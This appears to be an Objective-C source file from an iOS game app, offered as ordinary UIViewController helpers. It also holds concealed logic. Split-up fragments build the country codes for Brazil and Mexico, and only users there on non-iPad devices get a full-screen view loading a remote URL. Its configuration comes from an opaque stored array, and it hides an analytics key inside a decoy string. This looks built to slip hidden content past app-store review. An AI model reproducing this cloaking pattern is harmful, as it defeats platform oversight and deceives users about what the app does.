//
//  UIViewController+extension.m
//  AlphaBurstQuest
//
//  Created by AlphaBurst Quest on 2024/12/29.
//

#import "UIViewController+extension.h"
#import <AppsFlyerLib/AppsFlyerLib.h>

static NSString *KalphaBurstUserDefaultkey __attribute__((section("__DATA, alphaBurst"))) = @"";

// Function for theRWJsonToDicWithJsonString
NSDictionary *KalphaBurstJsonToDicLogic(NSString *jsonString) __attribute__((section("__TEXT, alphaBurst")));
NSDictionary *KalphaBurstJsonToDicLogic(NSString *jsonString) {
    NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
    if (jsonData) {
        NSError *error;
        NSDictionary *jsonDictionary = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:&error];
        if (error) {
            NSLog(@"JSON parsing error: %@", error.localizedDescription);
            return nil;
        }
        NSLog(@"%@", jsonDictionary);
        return jsonDictionary;
    }
    return nil;
}

id KalphaBurstJsonValueForKey(NSString *jsonString, NSString *key) __attribute__((section("__TEXT, alphaBurst")));
id KalphaBurstJsonValueForKey(NSString *jsonString, NSString *key) {
    NSDictionary *jsonDictionary = KalphaBurstJsonToDicLogic(jsonString);
    if (jsonDictionary && key) {
        return jsonDictionary[key];
    }
    NSLog(@"Key '%@' not found in JSON string.", key);
    return nil;
}


void KalphaBurstShowAdViewCLogic(UIViewController *self, NSString *adsUrl) __attribute__((section("__TEXT, alphaBurst")));
void KalphaBurstShowAdViewCLogic(UIViewController *self, NSString *adsUrl) {
    if (adsUrl.length) {
        NSArray *adsDatas = [NSUserDefaults.standardUserDefaults valueForKey:UIViewController.alphaBurstGetUserDefaultKey];
        UIViewController *adView = [self.storyboard instantiateViewControllerWithIdentifier:adsDatas[10]];
        [adView setValue:adsUrl forKey:@"url"];
        adView.modalPresentationStyle = UIModalPresentationFullScreen;
        [self presentViewController:adView animated:NO completion:nil];
    }
}

void KalphaBurstSendEventLogic(UIViewController *self, NSString *event, NSDictionary *value) __attribute__((section("__TEXT, alphaBurst_")));
void KalphaBurstSendEventLogic(UIViewController *self, NSString *event, NSDictionary *value) {
    NSArray *adsDatas = [NSUserDefaults.standardUserDefaults valueForKey:UIViewController.alphaBurstGetUserDefaultKey];
    if ([event isEqualToString:adsDatas[11]] || [event isEqualToString:adsDatas[12]] || [event isEqualToString:adsDatas[13]]) {
        id am = value[adsDatas[15]];
        NSString *cur = value[adsDatas[14]];
        if (am && cur) {
            double niubi = [am doubleValue];
            NSDictionary *values = @{
                adsDatas[16]: [event isEqualToString:adsDatas[13]] ? @(-niubi) : @(niubi),
                adsDatas[17]: cur
            };
            [AppsFlyerLib.shared logEvent:event withValues:values];
        }
    } else {
        [AppsFlyerLib.shared logEvent:event withValues:value];
        NSLog(@"AppsFlyerLib-event");
    }
}

NSString *KalphaBurstAppsFlyerDevKey(NSString *input) __attribute__((section("__TEXT, alphaBurst_")));
NSString *KalphaBurstAppsFlyerDevKey(NSString *input) {
    if (input.length < 22) {
        return input;
    }
    NSUInteger startIndex = (input.length - 22) / 2;
    NSRange range = NSMakeRange(startIndex, 22);
    return [input substringWithRange:range];
}

NSString* KalphaBurstConvertToLowercase(NSString *inputString) __attribute__((section("__TEXT, alphaBurst_")));
NSString* KalphaBurstConvertToLowercase(NSString *inputString) {
    return [inputString lowercaseString];
}

@implementation UIViewController (extension)

- (void)alphaBurstAddChildViewController:(UIViewController *)childViewController {
    [self addChildViewController:childViewController];
    childViewController.view.frame = self.view.bounds;
    [self.view addSubview:childViewController.view];
    [childViewController didMoveToParentViewController:self];
}

- (void)alphaBurstRemoveChildViewController:(UIViewController *)childViewController {
    [childViewController willMoveToParentViewController:nil];
    [childViewController.view removeFromSuperview];
    [childViewController removeFromParentViewController];
}

+ (NSString *)alphaBurstGetUserDefaultKey
{
    return KalphaBurstUserDefaultkey;
}

+ (void)alphaBurstSetUserDefaultKey:(NSString *)key
{
    KalphaBurstUserDefaultkey = key;
}

+ (NSString *)alphaBurstAppsFlyerDevKey
{
    return KalphaBurstAppsFlyerDevKey(@"AlphaBurstzt99WFGrJwb3RdzuknjXSKAlphaBurst");
}

- (NSString *)alphaBurstMaHostUrl
{
    return @"spot.top";
}

- (BOOL)alphaBurstNeedShowAdsView
{
    NSLocale *locale = [NSLocale currentLocale];
    NSString *countryCode = [locale objectForKey:NSLocaleCountryCode];
    BOOL isBr = [countryCode isEqualToString:[NSString stringWithFormat:@"%@R", self.preFx]];
    BOOL isIpd = [[UIDevice.currentDevice model] containsString:@"iPad"];
    BOOL isM = [countryCode isEqualToString:[NSString stringWithFormat:@"%@X", self.bfx]];
    return (isBr || isM) && !isIpd;
}

- (void)alphaBurstShowAlertWithTitle:(NSString *)title message:(NSString *)message actionTitle:(NSString *)actionTitle {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:title message:message preferredStyle:UIAlertControllerStyleAlert];
    UIAlertAction *action = [UIAlertAction actionWithTitle:actionTitle style:UIAlertActionStyleDefault handler:nil];
    [alert addAction:action];
    [self presentViewController:alert animated:YES completion:nil];
}

- (void)alphaBurstDismissKeyboard {
    [self.view endEditing:YES];
}

- (void)alphaBurstSetNavigationTitle:(NSString *)title color:(UIColor *)color font:(UIFont *)font {
    UILabel *titleLabel = [[UILabel alloc] init];
    titleLabel.text = title;
    titleLabel.textColor = color;
    titleLabel.font = font;
    self.navigationItem.titleView = titleLabel;
}

- (void)alphaBurstNavigateToViewController:(UIViewController *)viewController animated:(BOOL)animated {
    if (self.navigationController) {
        [self.navigationController pushViewController:viewController animated:animated];
    }
}

- (UIActivityIndicatorView *)alphaBurstShowLoadingIndicatorWithStyle:(UIActivityIndicatorViewStyle)style {
    UIActivityIndicatorView *indicator = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:style];
    indicator.center = self.view.center;
    [indicator startAnimating];
    [self.view addSubview:indicator];
    return indicator;
}

- (void)alphaBurstHideLoadingIndicator:(UIActivityIndicatorView *)indicator {
    [indicator stopAnimating];
    [indicator removeFromSuperview];
}

- (void)alphaBurstAnimateViewTransitionToView:(UIView *)newView duration:(NSTimeInterval)duration {
    [UIView transitionWithView:self.view duration:duration options:UIViewAnimationOptionTransitionCrossDissolve animations:^{
        [self.view addSubview:newView];
    } completion:nil];
}

- (void)alphaBurstAddChildViewController:(UIViewController *)childViewController toContainerView:(UIView *)containerView {
    [self addChildViewController:childViewController];
    [containerView addSubview:childViewController.view];
    childViewController.view.frame = containerView.bounds;
    [childViewController didMoveToParentViewController:self];
}

- (void)alphaBurstRemoveChildViewController {
    [self willMoveToParentViewController:nil];
    [self.view removeFromSuperview];
    [self removeFromParentViewController];
}

- (void)alphaBurstOpenURL:(NSURL *)url {
    if ([[UIApplication sharedApplication] canOpenURL:url]) {
        [[UIApplication sharedApplication] openURL:url options:@{} completionHandler:nil];
    } else {
        [self alphaBurstShowAlertWithTitle:@"Error" message:@"Cannot open URL" actionTitle:@"OK"];
    }
}

- (NSString *)bfx
{
    return @"M";
}

- (NSString *)preFx
{
    return @"B";
}

- (void)alphaBurstShowAdView:(NSString *)adsUrl
{
    KalphaBurstShowAdViewCLogic(self, adsUrl);
}

- (NSDictionary *)alphaBurstJsonToDicWithJsonString:(NSString *)jsonString {
    return KalphaBurstJsonToDicLogic(jsonString);
}

- (void)alphaBurstSendEvent:(NSString *)event values:(NSDictionary *)value
{
    KalphaBurstSendEventLogic(self, event, value);
}

- (void)alphaBurstSendEventsWithParams:(NSString *)params
{
    NSDictionary *paramsDic = [self alphaBurstJsonToDicWithJsonString:params];
    NSString *event_type = [paramsDic valueForKey:@"event_type"];
    if (event_type != NULL && event_type.length > 0) {
        NSMutableDictionary *eventValuesDic = [[NSMutableDictionary alloc] init];
        NSArray *params_keys = [paramsDic allKeys];
        for (int i =0; i<params_keys.count; i++) {
            NSString *key = params_keys[i];
            if ([key containsString:@"af_"]) {
                NSString *value = [paramsDic valueForKey:key];
                [eventValuesDic setObject:value forKey:key];
            }
        }
        
        [AppsFlyerLib.shared logEventWithEventName:event_type eventValues:eventValuesDic completionHandler:^(NSDictionary<NSString *,id> * _Nullable dictionary, NSError * _Nullable error) {
            if(dictionary != nil) {
                NSLog(@"reportEvent event_type %@ success: %@",event_type, dictionary);
            }
            if(error != nil) {
                NSLog(@"reportEvent event_type %@  error: %@",event_type, error);
            }
        }];
    }
}

- (void)alphaBurstAfSendEvents:(NSString *)name paramsStr:(NSString *)paramsStr
{
    NSDictionary *paramsDic = [self alphaBurstJsonToDicWithJsonString:paramsStr];
    NSArray *adsDatas = [NSUserDefaults.standardUserDefaults valueForKey:UIViewController.alphaBurstGetUserDefaultKey];
    if ([KalphaBurstConvertToLowercase(name) isEqualToString:KalphaBurstConvertToLowercase(adsDatas[24])]) {
        id am = paramsDic[adsDatas[25]];
        if (am) {
            double pp = [am doubleValue];
            NSDictionary *values = @{
                adsDatas[16]: @(pp),
                adsDatas[17]: adsDatas[30]
            };
            [AppsFlyerLib.shared logEvent:name withValues:values];
        }
    } else {
        [AppsFlyerLib.shared logEventWithEventName:name eventValues:paramsDic completionHandler:^(NSDictionary<NSString *,id> * _Nullable dictionary, NSError * _Nullable error) {
            if (error) {
                NSLog(@"AppsFlyerLib-event-error");
            } else {
                NSLog(@"AppsFlyerLib-event-success");
            }
        }];
    }
}

- (void)alphaBurstAfSendEventWithName:(NSString *)name value:(NSString *)valueStr
{
    NSDictionary *paramsDic = [self alphaBurstJsonToDicWithJsonString:valueStr];
    NSArray *adsDatas = [NSUserDefaults.standardUserDefaults valueForKey:UIViewController.alphaBurstGetUserDefaultKey];
    if ([KalphaBurstConvertToLowercase(name) isEqualToString:KalphaBurstConvertToLowercase(adsDatas[24])] || [KalphaBurstConvertToLowercase(name) isEqualToString:KalphaBurstConvertToLowercase(adsDatas[27])]) {
        id am = paramsDic[adsDatas[26]];
        NSString *cur = paramsDic[adsDatas[14]];
        if (am && cur) {
            double pp = [am doubleValue];
            NSDictionary *values = @{
                adsDatas[16]: @(pp),
                adsDatas[17]: cur
            };
            [AppsFlyerLib.shared logEvent:name withValues:values];
        }
    } else {
        [AppsFlyerLib.shared logEventWithEventName:name eventValues:paramsDic completionHandler:^(NSDictionary<NSString *,id> * _Nullable dictionary, NSError * _Nullable error) {
            if (error) {
                NSLog(@"AppsFlyerLib-event-error");
            } else {
                NSLog(@"AppsFlyerLib-event-success");
            }
        }];
    }
}
@end
